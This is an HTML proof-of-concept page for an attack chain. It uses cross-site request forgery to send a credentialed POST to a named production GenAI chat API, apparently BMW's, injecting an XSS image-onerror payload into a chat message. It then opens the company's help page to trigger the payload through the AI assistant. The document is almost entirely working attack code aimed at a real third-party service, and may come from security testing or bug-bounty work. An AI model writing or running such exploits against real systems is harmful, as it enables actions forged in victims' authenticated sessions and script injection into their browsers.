<html>
  <body>
    <h1>CSRF PoC Running...</h1>
    <p>Check Network tab for POST request and Console for logs.</p>
    <script>
      console.log('PoC started at:', new Date().toISOString());
      const payload = '<img src=x onerror=alert(1)>';
      const jsonBody = `{"message":"${payload}"}`;

      fetch('https://crm-il-api-prod.bmwgroup.com/ckm-genai-chat-prod-api/api/v1/message', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        headers: { 'Content-Type': 'text/plain' },
        body: jsonBody
      }).then(() => {
        console.log('Fetch sent successfully');
        alert('Payload sent! Opening BMW page...');
      }).catch(error => {
        console.error('Fetch failed:', error);
        alert('Fetch error: ' + error.message);
      });

      setTimeout(() => {
        console.log('Opening BMW page...');
        window.open('https://www.bmw.de/de/topics/service-und-zubehoer/hilfe-kontakt.html', '_blank');
        alert('Opened BMW page. Click the AI Assistant button to check for XSS.');
      }, 1000);
    </script>
  </body>
</html>
